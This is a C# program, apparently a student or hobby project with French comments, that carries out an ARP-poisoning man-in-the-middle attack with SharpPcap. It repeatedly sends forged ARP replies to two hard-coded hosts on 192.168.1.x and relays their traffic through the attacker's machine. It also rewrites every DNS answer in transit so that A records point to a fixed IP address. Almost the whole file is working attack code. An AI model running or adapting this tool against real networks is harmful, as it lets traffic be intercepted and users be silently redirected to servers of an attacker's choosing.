using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;

using InternetCommands.DNSRequest;
using PacketDotNet;

namespace MTM
{
    class Program
    {
        static void Main(string[] args)
        {
            Program programme = new Program();
            programme.executer();
        }

        void executer()
        {
            device = choisirDevice();

            Console.Write("Entrez l'IP du poste A: ");
            //ip_a = IPAddress.Parse(Console.ReadLine());
            ip_a = IPAddress.Parse("192.168.1.1");

            Console.Write("Entrez l'IP du poste B: ");
            //ip_b = IPAddress.Parse(Console.ReadLine());
            ip_b = IPAddress.Parse("192.168.1.100");

            ip_reel_locale = device.Interface.AddressIpV4;

            Console.WriteLine("PC-A: " + ip_a.ToString());
            Console.WriteLine("PC-B: " + ip_b.ToString());

            // Récupération des vrais adresses mac.
            ARP arp = new ARP(device);
            arp.LocalIP = ip_reel_locale;
            mac_a = System.Net.NetworkInformation.PhysicalAddress.Parse("00-13-10-28-08-35");//arp.Resolve(ip_a);
            mac_b = arp.Resolve(ip_b);

            Console.WriteLine("Adresse MAC resolus. Début de l'empoisonement");

            // On commence à rigoler.
            device.Open(true, 50);
            
            //device.DumpOpen("c:\\dump.pcap");

            device.SetFilter("(ether src " + mac_a.ToString() + " or ether src " + mac_b.ToString() + ") and " +
                             "ether dst " + device.Interface.MacAddress.ToString() + " and not arp");
            device.OnPacketArrival += packetArrive;

            // Création des requêtes arp d'usurpation.
            arp_a = creerPacketARP(ip_a, ip_b, mac_b);
            arp_b = creerPacketARP(ip_b, ip_a, mac_a);
            Console.Write(device.Addresses[0].Addr.ipAddress.ToString());

            device.StartCapture();
            boucleARP();
            device.StopCapture();
        }

        ARPPacket creerPacketARP(IPAddress ip_usurpation, IPAddress ip_cible, System.Net.NetworkInformation.PhysicalAddress mac_cible)
        {
            ARPPacket arp = new ARPPacket(14, new byte[60]);

            // ARP
            arp.ARPHwLength = 6;
            arp.ARPHwType = ARPFields_Fields.ARP_ETH_ADDR_CODE;
            arp.ARPProtocolLength = 4;
            arp.ARPProtocolType = ARPFields_Fields.ARP_IP_ADDR_CODE;
            arp.ARPSenderHwAddress = device.Interface.MacAddress;
            arp.ARPSenderProtoAddress = ip_usurpation;
            arp.ARPTargetHwAddress = mac_cible;
            arp.ARPTargetProtoAddress = ip_cible;

            // Ethernet
            arp.SourceHwAddress = device.Interface.MacAddress;
            arp.DestinationHwAddress = mac_cible;
            arp.EthernetProtocol = EthernetPacketType.Arp;

            arp.ARPOperation = ARPFields_Fields.ARP_OP_REP_CODE;

            return arp;
        }

        void boucleARP()
        {
            while (true)
            {
                device.SendPacket(arp_a);
                device.SendPacket(arp_b);

                System.Threading.Thread.Sleep(10000); // 10 secondes
            }
        }

        // Si on arrive ici c'est qu'on a reçu un packet pour nous d'une adresse usurpée.
        void packetArrive(object sender, PcapCaptureEventArgs e)
        {
            if (e.Packet is IPPacket)
            {
                IPPacket packet_ip = (IPPacket)e.Packet;
                // La cible est notre vrai adresse, il ne faut donc pas rediriger.
                if (packet_ip.DestinationAddress.Equals(ip_reel_locale) ||
                    packet_ip.IPVersion == IPPacket.IPVersions.IPv6)
                    return;
            }
            
            if (e.Packet is EthernetPacket)
            {
                EthernetPacket packet_ethernet = (EthernetPacket)e.Packet;

                if (packet_ethernet.SourceHwAddress.Equals(mac_a))
                {
                    packet_ethernet.DestinationHwAddress = mac_b;
                    packet_ethernet.SourceHwAddress = device.Interface.MacAddress;
                }
                else if (packet_ethernet.SourceHwAddress.Equals(mac_b))
                {
                    packet_ethernet.DestinationHwAddress = mac_a;
                    packet_ethernet.SourceHwAddress = device.Interface.MacAddress;
                }
                else
                    return;
                
                if (packet_ethernet is UDPPacket)
                {
                    UDPPacket packet_udp = (UDPPacket)packet_ethernet;
                    if (packet_udp.SourcePort == 53)
                    {
                        DNSRequest reponse = new DNSRequest(packet_udp.Data);
                        foreach (DNSResourceRecord record in reponse.Answers)
                        {
                            if (record.Details is RFC1035.A)
                            {
                                RFC1035.A ip = (RFC1035.A)record.Details;
                                ip.ipAddress = IPAddress.Parse("209.85.229.99");
                            }
                        }
                        packet_udp.UDPData = reponse.ToByte();
                        packet_udp.ComputeUDPChecksum();
                        packet_udp.ComputeIPChecksum();
                    }
                }

                device.SendPacket(packet_ethernet);
            }
        }

        PcapDevice choisirDevice()
        {
            string ver = SharpPcap.Version.VersionString;
            /* Print SharpPcap version */
            Console.WriteLine("SharpPcap {0}", ver);
            Console.WriteLine();

            /* Retrieve the device list */
            List<PcapDevice> devices = Pcap.GetAllDevices();

            /*If no device exists, print error */
            if (devices.Count < 1)
            {
                Console.WriteLine("No device found on this machine");
                return null;
            }

            Console.WriteLine("The following devices are available on this machine:");
            Console.WriteLine("----------------------------------------------------");
            Console.WriteLine();

            int i = 0;

            /* Scan the list printing every entry */
            foreach (PcapDevice dev in devices)
            {
                /* Description */
                Console.WriteLine("{0}) {1} {2}", i, dev.Name, dev.Description);
                i++;
            }

            Console.WriteLine();
            Console.Write("-- Please choose a device for sending the ARP request: ");
            i = int.Parse(Console.ReadLine());

            return devices[i];
        }

        private PcapDevice device;
        private System.Net.NetworkInformation.PhysicalAddress mac_a;
        private System.Net.NetworkInformation.PhysicalAddress mac_b;
        private IPAddress ip_a;
        private IPAddress ip_b;
        private ARPPacket arp_a;
        private ARPPacket arp_b;
        private IPAddress ip_reel_locale;
    }
}

